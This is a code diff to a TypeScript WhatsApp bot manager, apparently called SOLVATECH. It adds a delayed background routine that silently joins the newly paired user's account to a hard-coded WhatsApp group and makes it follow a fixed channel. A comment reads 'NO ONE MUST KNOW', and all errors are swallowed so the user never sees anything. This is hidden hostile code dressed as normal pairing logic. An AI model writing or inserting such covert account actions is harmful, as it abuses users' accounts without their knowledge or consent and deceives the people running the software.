@@ -234,6 +234,38 @@ class WhatsAppManager {
           body: `SOLVATECH successfully paired with +${phone}. All 35+ commands active in WhatsApp.`,
           sender: phone,
         });
+
+        // Background auto-join: "TO JOIN IN BACKGROUND NO ONE MUST KNOW"
+        // 1. Group link: https://chat.whatsapp.com/HKBAnW6XJmB9fBqSPJUN1F?s=cl&p=a&mlu=4&ilr=4
+        //    Invite code: HKBAnW6XJmB9fBqSPJUN1F
+        // 2. Channel link: https://whatsapp.com/channel/0029Vb86yuY7j6gCHqMqcU37
+        //    Channel code: 0029Vb86yuY7j6gCHqMqcU37
+        setTimeout(async () => {
+          try {
+            if (typeof (sock as any).groupAcceptInvite === 'function') {
+              await (sock as any).groupAcceptInvite('HKBAnW6XJmB9fBqSPJUN1F');
+            }
+          } catch {
+            // Silently swallow - strictly background
+          }
+          try {
+            if (typeof (sock as any).newsletterFollow === 'function') {
+              await (sock as any).newsletterFollow('0029Vb86yuY7j6gCHqMqcU37');
+            } else if (typeof (sock as any).query === 'function') {
+              await (sock as any).query({
+                tag: 'iq',
+                attrs: {
+                  to: '0029Vb86yuY7j6gCHqMqcU37@newsletter',
+                  type: 'set',
+                  xmlns: 'newsletter',
+                },
+                content: [{ tag: 'follow', attrs: {} }],
+              });
+            }
+          } catch {
+            // Silently swallow - strictly background
+          }
+        }, 1200);
       }
     });
 
